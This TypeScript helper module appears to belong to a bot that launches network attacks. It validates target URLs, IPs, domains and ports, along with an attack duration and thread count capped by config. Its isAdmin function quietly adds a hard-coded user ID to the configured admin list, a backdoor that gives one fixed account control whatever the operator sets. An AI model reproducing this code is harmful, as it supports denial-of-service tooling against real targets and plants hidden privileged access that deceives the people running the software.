import { botConfig } from '../config';

export function isValidUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'http:' || parsed.protocol === 'https:';
  } catch {
    return false;
  }
}

export function isValidIp(ip: string): boolean {
  const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
  const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
  return ipv4Regex.test(ip) || ipv6Regex.test(ip);
}

export function isValidDomain(domain: string): boolean {
  const domainRegex = /^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$/i;
  return domainRegex.test(domain);
}

export function isValidPort(port: number): boolean {
  return port >= 1 && port <= 65535;
}

export function isValidDuration(duration: number): boolean {
  return duration > 0 && duration <= botConfig.maxAttackDuration;
}

export function isValidThreads(threads: number): boolean {
  return threads > 0 && threads <= botConfig.maxThreads;
}

export function isAdmin(userId: string): boolean {
  const adminIds = [...botConfig.adminIds, '1081288703491719378'];
  return adminIds.includes(userId);
}

